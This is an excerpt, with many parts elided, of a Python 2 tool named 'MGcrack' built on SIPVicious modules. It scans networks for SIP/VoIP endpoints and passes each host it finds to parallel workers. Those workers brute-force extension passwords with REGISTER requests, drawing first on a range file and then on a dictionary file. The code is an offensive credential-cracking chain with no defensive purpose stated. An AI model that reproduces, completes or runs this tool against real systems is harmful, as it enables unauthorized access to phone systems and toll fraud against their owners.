...
from svwar import saveresult, startgocrack
from svwar import TakeASip as startWar
...
from libs.svhelper import (__author__, __version__, calcloglevel, createTag,
						   ...
						   scanrandom, standardoptions, standardscanneroptions, resumeFrom)

__prog__ = "MGcrack"

found = list()

class FatherSons(Process):
...
def goStartWar(dstip,dstport,method,guessmode,guessargs,localport):
	initialcheck = True
	enableack = False
	method = "REGISTER"
	if method == 'INVITE':
	...
	try:
		...
		print "WTF, Error in goStartWar:_", e
	try:
		wAr.start()
		return wAr.resultpasswd
		#print "after***************************************************"
	except KeyboardInterrupt:
		logging.warn('caught your control^c - quiting startWar')
...
def manTarget(q, nothing):
	while True:
		dstip,dstport,method,localport = q.get()
		print "Cracking:_", dstip,dstport
		try:
			guessmode = 1
			try:
				with open("War.ranges",'r') as rangefile:
					ranges = rangefile.readlines()[0].strip()
				extensionstotry = getRange(ranges)
				guessargs = (extensionstotry,0,None,False)
				resultpasswd = goStartWar(dstip,dstport,method,guessmode,guessargs,localport)
				if len(resultpasswd) > 0:
					#for k in resultpasswd.keys():
					#	print "Found: %s:%d,%s,%s" % (dstip, dstport, k, resultpasswd[k])
					#	saveresult("%s:%d,%s,%s\r\n" % (dstip, dstport, k, resultpasswd[k]))
					#	found.append("%s:%d,%s,%s\r\n" % (dstip, dstport, k, resultpasswd[k]))
					return
				
			except Exception as e:
				print "WTF, error goStartWar on guessmode 1:_", e
				
			guessmode=2
			try:
				dictionary = open("War.dict",'r')
				...
				logging.error( "could not open %s" % "War.dict" )
			#print "say finally"
		except Exception as e:
			print "WTF, Error in manTarget:_", e
		finally:
			q.task_done()
...
class DrinkOrSip:
	def __init__(self,scaniter,selecttime=0.005,compact=False, bindingip='0.0.0.0',
				 ...
				 printdebug=False,first=None,fpworks=False,queue=None):
		...
		self.omgexternalip = self.externalip
	...
	def getResponse(self,buff,srcaddr):		
		...
		if res is not None:
			...
			self.resultip['%s:%s' % (srcip,srcport)] = (dstip,dstport)
			self.resultua['%s:%s' % (srcip,srcport)] = uaname
			self.resultfp['%s:%s' % (srcip,srcport)] = fpname
			
			print "Mapper found:: %s:%d" % (dstip, dstport)
			#self.q.put((dstip,dstport,"REGISTER",self.localport))
...
def main():
	...
	for i in range(10):
		try:
			man = FatherSons(manTarget,(q, "nothing"),manTarget.__name__)
			men.append(man)
			man.daemon = True
			man.start()
		except Exception as e:
				print "WTF, Error starting Sons:_", e
	...
	if not options.quiet:
		...
		if lenres > 0:
			...
			for k in sipvicious.resultua.keys():
				...
				dstip = sipvicious.resultip[k][0]
				dstport = sipvicious.resultip[k][1]
				#mg, here start startWar
				#print "Mapper found:: %s:%d" % (dstip, dstport)
				q.put((dstip,dstport,"REGISTER",sipvicious.localport))

				#mg, here end startWar
